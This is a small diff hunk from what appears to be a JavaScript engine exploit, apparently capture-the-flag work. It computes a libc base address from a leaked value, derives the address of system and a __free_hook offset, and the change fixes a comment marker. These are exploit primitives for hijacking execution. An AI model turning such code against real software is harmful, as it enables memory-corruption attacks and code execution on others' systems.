@@ -58,7 +58,7 @@ var little_libc = ftoi(view.getFloat64(0));
 
 var libc = BigInt(ltob(little_libc.toString(16)))- offset;
 var system = libc + 324944n;//0x55410n//324944n;
-var free_hook_offset = 4118760n;0x1eeb28n//4118760n;
+var free_hook_offset = 4118760n;//0x1eeb28n//4118760n;
 
 
 console.log('[+] libc base : 0x'+libc.toString(16));
